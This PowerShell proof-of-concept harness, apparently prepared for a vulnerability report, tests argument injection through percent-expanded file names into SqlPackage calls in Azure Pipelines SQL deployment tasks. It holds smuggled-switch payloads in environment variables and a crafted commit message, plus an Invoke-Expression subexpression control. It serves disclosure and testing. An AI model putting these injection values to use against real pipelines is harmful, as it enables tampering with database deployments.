# Round 2: does the stop-parsing token's percent expansion produce NEW argv elements
# at the receiving native process, past the last point Microsoft's code validates anything.
# Two code paths are exercised, both lifted verbatim by the PowerShell AST parser:
#   Part A  TaskModuleSqlUtility 0.1.7, restored into SqlDacpacDeploymentOnMachineGroupV0
#   Part B  Tasks/SqlAzureDacpacDeploymentV1, in the azure-pipelines-tasks repository
# Synthetic markers only. No database, no Microsoft service, no network target.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("sp2-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path $work | Out-Null
$COMMIT = '73758eeda253f36df25b66462431316723beef73'

Write-Output "=================================================================="
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)
Write-Output ("OS        : " + [System.Environment]::OSVersion.VersionString)
Write-Output "=================================================================="

# Returns the verbatim source text of the named functions. The caller dot-sources the
# result at script scope, so the definitions are the shipped ones, byte for byte.
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        if (-not $f) { throw "function $name not found in $file" }
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber), $($f.Extent.Text.Length) bytes")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}

# ---------------------------------------------------------------- Part A source
Write-Output ""
Write-Output "PART A source: TaskModuleSqlUtility 0.1.7 nupkg"
$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Write-Output ("  nupkg sha256    : " + (Get-FileHash -Algorithm SHA256 $nupkg).Hash.ToLower())
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("  module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

# ---------------------------------------------------------------- Part B source
Write-Output ""
Write-Output "PART B source: Tasks/SqlAzureDacpacDeploymentV1/Utility.ps1 at $COMMIT"
$utilUrl = "https://raw.githubusercontent.com/microsoft/azure-pipelines-tasks/$COMMIT/Tasks/SqlAzureDacpacDeploymentV1/Utility.ps1"
$utilFile = Join-Path $work 'Utility.ps1'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -UseBasicParsing -Uri $utilUrl -OutFile $utilFile
Write-Output ("  Utility.ps1 sha256 : " + (Get-FileHash -Algorithm SHA256 $utilFile).Hash.ToLower())
function Get-VstsLocString { param([string]$Key, $ArgumentList) return "locstring:$Key" }
. ([scriptblock]::Create((Get-LiftedText $utilFile @('Get-SqlPackageCommandArguments','Execute-Command'))))

# ------------------------------------------------------- the native receiver
$csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$argvdump = Join-Path $work 'sqlpackage.exe'
& $csc /nologo /out:$argvdump (Join-Path $here 'argvdump.cs') | Out-Null
Write-Output ""
Write-Output ("argv receiver : " + (Split-Path -Leaf $argvdump) + "  (a real native .exe standing in for SqlPackage.exe)")

# ------------------------------------------------------------- the process env
$env:MSRC_PLAIN = 'PLAINVALUE'
$env:MSRC_SPLIT = 'x /p:InjectedOption=1 y'
$env:MSRC_ARGV  = 'x" /p:InjectedOption=1 /q:"y'
$env:BUILD_SOURCEVERSIONMESSAGE = 'fix db" /Action:Script /OutputPath:"C:\Windows\Temp\PWNED-stopparsing.sql'
Remove-Item Env:\MSRC_UNDEFINED_VAR -ErrorAction SilentlyContinue

$global:MARKER = 'not-executed'
function Get-Marker { $global:MARKER = 'EXECUTED-BY-POWERSHELL'; return 'X' }

function Report([string]$label, [string]$dacpac, [string]$argstring, [scriptblock]$runner) {
    Write-Output ""
    Write-Output "--- $label"
    Write-Output "    committed file name : $dacpac"
    Write-Output "    argument string     : $argstring"
    $global:MARKER = 'not-executed'
    $out = & $runner
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | ForEach-Object { Write-Output "    $($_.Trim())" }
    Write-Output "    powershell marker   : $global:MARKER"
}

$base = 'C:\agent\_work\r1\a\db'
$names = [ordered]@{
  'CONTROL  ordinary name'                          = "$base\Fabrikam.dacpac"
  'CONTROL  undefined percent variable'             = "$base\Fab%MSRC_UNDEFINED_VAR%rikam.dacpac"
  'INJECT   percent var, no space no quote'         = "$base\Fab%MSRC_PLAIN%rikam.dacpac"
  'INJECT   percent var carrying a SPACE only'      = "$base\Fab%MSRC_SPLIT%rikam.dacpac"
  'INJECT   percent var carrying QUOTE plus SPACE'  = "$base\Fab%MSRC_ARGV%rikam.dacpac"
  'INJECT   realistic commit message via BUILD_SOURCEVERSIONMESSAGE' = "$base\Fab%BUILD_SOURCEVERSIONMESSAGE%rikam.dacpac"
}

Write-Output ""
Write-Output "################ PART A  TaskModuleSqlUtility 0.1.7, ExecuteCommand line 554"
foreach ($k in $names.Keys) {
    $d = $names[$k]
    $a = Get-SqlPackageCmdArgs -dacpacFile $d -targetMethod 'server' -serverName 'sqlprod01' -databaseName 'Fabrikam' -additionalArguments ''
    Report $k $d $a { ExecuteCommand -FileName "$argvdump" -Arguments $a }
}

Write-Output ""
Write-Output "################ PART B  SqlAzureDacpacDeploymentV1, Utility.ps1 line 286"
foreach ($k in $names.Keys) {
    $d = $names[$k]
    $a = Get-SqlPackageCommandArguments -sqlpackageAction 'Publish' -sourceFile $d -targetServerName 'sqlprod01.database.windows.net' -targetDatabaseName 'Fabrikam' -authenticationType 'server' -targetUser 'appuser' -targetPassword 'S3cret' -additionalArguments ''
    Report $k $d $a { Execute-Command -FileName "$argvdump" -Arguments $a 6>&1 2>&1 }
}

Write-Output ""
Write-Output "################ HARNESS POSITIVE CONTROL  same bytes, --% deleted (Part A shape)"
function ExecuteCommand_NoStopParsing {
    param([String]$FileName, [String]$Arguments)
    $ErrorActionPreference = 'SilentlyContinue'
    $result = ""
    Invoke-Expression "& '$FileName' $Arguments" -ErrorVariable errors | ForEach-Object { $result += ("$_ " + [Environment]::NewLine) }
    $ErrorActionPreference = 'Stop'
    return $result
}
$d = "$base\Fab`$(Get-Marker)rikam.dacpac"
$a = Get-SqlPackageCmdArgs -dacpacFile $d -targetMethod 'server' -serverName 'sqlprod01' -databaseName 'Fabrikam' -additionalArguments ''
Report 'POSITIVE CONTROL subexpression, --% deleted' $d $a { ExecuteCommand_NoStopParsing -FileName "$argvdump" -Arguments $a }

Write-Output ""
Write-Output "DONE"
